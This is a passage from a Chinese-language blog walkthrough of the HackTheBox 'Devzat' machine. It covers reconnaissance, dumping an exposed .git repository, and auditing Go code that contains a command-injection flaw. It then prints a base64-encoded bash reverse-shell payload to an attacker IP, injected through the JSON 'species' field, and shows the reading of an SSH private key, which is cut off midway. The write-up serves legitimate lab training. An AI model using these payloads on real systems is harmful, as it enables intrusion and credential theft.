<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Devzat - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Devzat靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行信息搜集 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.118 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-19 03:18 E">
<meta property="og:type" content="article">
<meta property="og:title" content="Devzat - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Devzat靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行信息搜集 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.118 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-19 03:18 E">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/afd4673b-eefd-4e1a-8aa5-9e0aa2ce21fb.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/aa4fdde1-b932-4085-a9e1-47aec6593959.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/0cecff08-8715-4b72-b911-715c109787c0.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/874775c0-4e3b-432b-a6ed-5f7dcf9b9b1d.png">
<meta property="article:published_time" content="2022-02-20T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:42:57.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/afd4673b-eefd-4e1a-8aa5-9e0aa2ce21fb.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                请我喝咖啡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Devzat - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Devzat - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-02-20T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-02-20
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Devzat"><span class="post-toc-text">Hackthebox - Devzat</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#GitTools"><span class="post-toc-text">GitTools</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#代码审计"><span class="post-toc-text">代码审计</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell"><span class="post-toc-text">Shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#User"><span class="post-toc-text">User</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#端口转发"><span class="post-toc-text">端口转发</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nmap-1"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Exploit"><span class="post-toc-text">Exploit</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Catherine"><span class="post-toc-text">Catherine</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Medium/Hackthebox-Devzat"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Devzat - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-02-20 19:38:36" datetime="2022-02-20T11:38:36.000Z"  itemprop="datePublished">2022-02-20</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Devzat"><a href="#Hackthebox-Devzat" class="headerlink" title="Hackthebox - Devzat"></a>Hackthebox - Devzat</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/afd4673b-eefd-4e1a-8aa5-9e0aa2ce21fb.png" class>

<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/aa4fdde1-b932-4085-a9e1-47aec6593959.png" class>

<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>首先使用nmap进行信息搜集</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.118
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 03:18 EST
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.24s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: devzat - where the devs at
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.91%I=7%D=2/19%Time=6210A7FD%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,&quot;SSH-2\.0-Go\r\n&quot;);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=34522%PV=Y%DS=2%DC=T%G=Y%TM=6210A83
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   241.16 ms 10.10.14.1
2   241.26 ms devzat.htb (10.10.11.118)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.93 seconds
</code></pre>
<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>这里有一个http服务在80端口，直接访问ip会被跳转到devzat.htb页面，咱们添加到hosts再继续访问</p>
<pre><code class="bash">echo 10.10.11.118 devzat.htb &gt;&gt; /etc/hosts
</code></pre>
<img src="/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/0cecff08-8715-4b72-b911-715c109787c0.png" class>

<p>这个功能页面有点不明所以，往下看看</p>
<img src="/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/874775c0-4e3b-432b-a6ed-5f7dcf9b9b1d.png" class>

<p>这里提示了一条命令，ssh服务疑似在8000端口</p>
<p>搜索相关资料，找到了相关工具</p>
<blockquote>
<p><a href="https://github.com/quackduck/devzat" target="_blank" rel="noopener">https://github.com/quackduck/devzat</a></p>
</blockquote>
<p>去测试一下试试</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# ssh -l test devzat.htb -p 8000
                                                                                                                                                                                                   8 minutes earlier
devbot: test has joined the chat 
test: test 
test: test 
test: test 
test: test 
devbot: test has left the chat 
devbot: test has joined the chat 
                                                                                                                                                                                                    1 minute earlier
devbot: test has left the chat 
devbot: test stayed on for 6 minutes 
devbot: test has joined the chat 
devbot: test has left the chat 
devbot: lucifiel has joined the chat
devbot: lucifiel has left the chat
devbot: test has joined the chat 
                                                                                                                                                                                          Less than a minute earlier
devbot: test has left the chat 
devbot: test stayed on for 1 minute 
Welcome to the chat. There are no more users
devbot: test has joined the chat
test: /help
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there&#39;s SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM] 
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user &lt;msg&gt; or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang &lt;word&gt; to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM] 
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM] 
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM] 
[SYSTEM] For a list of commands run
[SYSTEM] ┃ /commands
test: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
test: /users
[SYSTEM] [test]
</code></pre>
<p>没有发现可利用的点</p>
<h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><p>去fuzz一下子域名看下</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# ffuf -c -u http://devzat.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.devzat.htb&quot;  -mc 200 

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://devzat.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.devzat.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

pets                    [Status: 200, Size: 510, Words: 20, Lines: 21]
:: Progress: [4989/4989] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
</code></pre>
<p>有一个pets，加入hosts里</p>
<pre><code class="bash">echo 10.10.11.118 pets.devzat.htb &gt;&gt; /etc/hosts
</code></pre>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# ffuf -u &quot;http://pets.devzat.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 510

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://pets.devzat.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 510
________________________________________________

.git                    [Status: 301, Size: 41, Words: 3, Lines: 3]
.git/index              [Status: 200, Size: 3884, Words: 51, Lines: 11]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
.git/logs/              [Status: 200, Size: 63, Words: 3, Lines: 5]
build                   [Status: 301, Size: 42, Words: 3, Lines: 3]
css                     [Status: 301, Size: 40, Words: 3, Lines: 3]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
:: Progress: [4686/4686] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
</code></pre>
<p>可以看到有一个.git文件，那就是有git备份，下载下来</p>
<h3 id="GitTools"><a href="#GitTools" class="headerlink" title="GitTools"></a>GitTools</h3><blockquote>
<p><a href="https://github.com/LucifielHack/GitTools" target="_blank" rel="noopener">https://github.com/LucifielHack/GitTools</a></p>
</blockquote>
<p>使用GitTools给下载下来</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop/GitTools]
└─# ./Dumper/gitdumper.sh http://pets.devzat.htb/.git/ pets
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
</code></pre>
<p>使用gitdumper给dump下来</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop/GitTools]
└─# ./Extractor/extractor.sh pets ~/Desktop/pets/
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
</code></pre>
<p>然后使用exractor给解压出来</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop/pets]
└─# ls -la
总用量 20
drwxr-xr-x 5 root root 4096  2月 19 03:50 .
drwxr-xr-x 6 root root 4096  2月 19 03:50 ..
drwxr-xr-x 4 root root 4096  2月 19 03:50 0-464614f32483e1fde60ee53f5d3b4d468d80ff62
drwxr-xr-x 4 root root 4096  2月 19 03:50 1-ef07a04ebb2fc92cf74a39e0e4b843630666a705
drwxr-xr-x 4 root root 4096  2月 19 03:50 2-8274d7a547c0c3854c074579dfc359664082a8f6
</code></pre>
<p>下载可以去本地查看了</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><pre><code class="go">package main

import (
        &quot;embed&quot;
        &quot;encoding/json&quot;
        &quot;fmt&quot;
        &quot;io/fs&quot;
        &quot;io/ioutil&quot;
        &quot;log&quot;
        &quot;net/http&quot;
        &quot;os/exec&quot;
        &quot;time&quot;
)

//go:embed static/public
var web embed.FS

//go:embed static/public/index.html
var index []byte

type Pet struct {
        Name            string `json:&quot;name&quot;`
        Species         string `json:&quot;species&quot;`
        Characteristics string `json:&quot;characteristics&quot;`
}

var (
        Pets []Pet = []Pet{
                {Name: &quot;Cookie&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)},
                {Name: &quot;Mia&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)},
                {Name: &quot;Chuck&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)},
                {Name: &quot;Balu&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)},
                {Name: &quot;Georg&quot;, Species: &quot;gopher&quot;, Characteristics: loadCharacter(&quot;gopher&quot;)},
                {Name: &quot;Gustav&quot;, Species: &quot;giraffe&quot;, Characteristics: loadCharacter(&quot;giraffe&quot;)},
                {Name: &quot;Rudi&quot;, Species: &quot;redkite&quot;, Characteristics: loadCharacter(&quot;redkite&quot;)},
                {Name: &quot;Bruno&quot;, Species: &quot;bluewhale&quot;, Characteristics: loadCharacter(&quot;bluewhale&quot;)},
        }
)

func loadCharacter(species string) string {
        cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;cat characteristics/&quot;+species)
        stdoutStderr, err := cmd.CombinedOutput()
        if err != nil {
                return err.Error()
        }
        return string(stdoutStderr)
}

func getPets(w http.ResponseWriter, r *http.Request) {
        json.NewEncoder(w).Encode(Pets)
}

func addPet(w http.ResponseWriter, r *http.Request) {
        reqBody, _ := ioutil.ReadAll(r.Body)
        var addPet Pet
        err := json.Unmarshal(reqBody, &amp;addPet)
        if err != nil {
                e := fmt.Sprintf(&quot;There has been an error: %+v&quot;, err)
                http.Error(w, e, http.StatusBadRequest)
                return
        }

        addPet.Characteristics = loadCharacter(addPet.Species)
        Pets = append(Pets, addPet)

        w.WriteHeader(http.StatusOK)
        fmt.Fprint(w, &quot;Pet was added successfully&quot;)
}

func handleRequest() {
        build, err := fs.Sub(web, &quot;static/public/build&quot;)
        if err != nil {
                panic(err)
        }

        css, err := fs.Sub(web, &quot;static/public/css&quot;)
        if err != nil {
                panic(err)
        }

        webfonts, err := fs.Sub(web, &quot;static/public/webfonts&quot;)
        if err != nil {
                panic(err)
        }

        spaHandler := http.HandlerFunc(spaHandlerFunc)
        // Single page application handler
        http.Handle(&quot;/&quot;, headerMiddleware(spaHandler))

        // All static folder handler
        http.Handle(&quot;/build/&quot;, headerMiddleware(http.StripPrefix(&quot;/build&quot;, http.FileServer(http.FS(build)))))
        http.Handle(&quot;/css/&quot;, headerMiddleware(http.StripPrefix(&quot;/css&quot;, http.FileServer(http.FS(css)))))
        http.Handle(&quot;/webfonts/&quot;, headerMiddleware(http.StripPrefix(&quot;/webfonts&quot;, http.FileServer(http.FS(webfonts)))))
        http.Handle(&quot;/.git/&quot;, headerMiddleware(http.StripPrefix(&quot;/.git&quot;, http.FileServer(http.Dir(&quot;.git&quot;)))))

        // API routes
        apiHandler := http.HandlerFunc(petHandler)
        http.Handle(&quot;/api/pet&quot;, headerMiddleware(apiHandler))
        log.Fatal(http.ListenAndServe(&quot;:5000&quot;, nil))
}

func spaHandlerFunc(w http.ResponseWriter, r *http.Request) {
        w.WriteHeader(http.StatusOK)
        w.Write(index)
}

func petHandler(w http.ResponseWriter, r *http.Request) {
        // Dispatch by method
        if r.Method == http.MethodPost {
                addPet(w, r)
        } else if r.Method == http.MethodGet {
                getPets(w, r)

        } else {
                http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)
        }
        // TODO: Add Update and Delete
}

func headerMiddleware(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                w.Header().Add(&quot;Server&quot;, &quot;My genious go pet server&quot;)
                next.ServeHTTP(w, r)
        })
}

func main() {
        resetTicker := time.NewTicker(5 * time.Second)
        done := make(chan bool)

        go func() {
                for {
                        select {
                        case &lt;-done:
                                return
                        case &lt;-resetTicker.C:
                                // Reset Pets to prestaged ones
                                Pets = []Pet{
                                        {Name: &quot;Cookie&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)},
                                        {Name: &quot;Mia&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)},
                                        {Name: &quot;Chuck&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)},
                                        {Name: &quot;Balu&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)},
                                        {Name: &quot;Georg&quot;, Species: &quot;gopher&quot;, Characteristics: loadCharacter(&quot;gopher&quot;)},
                                        {Name: &quot;Gustav&quot;, Species: &quot;giraffe&quot;, Characteristics: loadCharacter(&quot;giraffe&quot;)},
                                        {Name: &quot;Rudi&quot;, Species: &quot;redkite&quot;, Characteristics: loadCharacter(&quot;redkite&quot;)},
                                        {Name: &quot;Bruno&quot;, Species: &quot;bluewhale&quot;, Characteristics: loadCharacter(&quot;bluewhale&quot;)},
                                }

                        }
                }
        }()

        handleRequest()

        time.Sleep(500 * time.Millisecond)
        resetTicker.Stop()
        done &lt;- true
}
</code></pre>
<p>发现存在一个main.go的文件，咱们看一下</p>
<pre><code class="go">cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;cat characteristics/&quot;+species)
addPet.Characteristics = loadCharacter(addPet.Species)
</code></pre>
<p>看下这两句，很明显的命令注入。</p>
<p>添加宠物功能点的species直接拼接在cmd中，咱们去构造Exploit</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><pre><code class="bash">echo &quot;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.47/4444 &lt;&amp;1&#39;&quot; | base64
YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg==

{&quot;name&quot;:&quot;lucifiel&quot;,&quot;species&quot;:&quot;cat;echo -n &#39;YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg==&#39; | base64 -d | bash&quot;}
</code></pre>
<p>首先去抓个包</p>


<p>接着替换exp然后使用nc监听一个端口</p>
<pre><code class="bash">nc -nvlp 4444
</code></pre>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nc -nvlp 4444        
listening on [any] 4444 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.118] 33274
bash: cannot set terminal process group (889): Inappropriate ioctl for device
bash: no job control in this shell
patrick@devzat:~/pets$ whoami&amp;&amp;id
whoami&amp;&amp;id
patrick
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)
</code></pre>
<p>成功获得一个shell</p>
<p>使用python3获得一个交互式shell</p>
<pre><code class="bash">python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
</code></pre>
<h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>在当前用户patrick目录下存在ssh秘钥</p>
<pre><code class="bash">cat /home/.ssh/id_rsa
</code></pre>
<pre><code class="bash">-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0z5vGXu4rlJWm2ffbekliU8N7KSuRj9tahP3+xTk/z/nKzb2UCi7
kh7oISloGR+05LuzZrv1sYWcFVBQ6ZIgxtZkj3iurshqbk5p3AqJhbw9wmpXRa2QjcW0Pw
W1nsjVaRfbM3lU8H3YGOTzaEBUNK3ksLXp1emrRAOVn62c4UmV1rlhJ/uxwfQusNWmqopD
0A0EsUQK3C2WOXIIzct+GTJOzC2lnIivff8RGLjRAG0db9P/CLVb+acg/EDBQ/rNjcB5On
id4apLNheVSXqiGS9oF7wZoL0CfHwS29KQTesWtcZDgD6UJKwS9KRBKihULHSWiMw6QgRp
hC9BPw3zug7MqvnZnBbLccH7zTvODpqA9lAK2/z8WT2jqMIxOOxkR5evHAyIt1CyoyqDIN
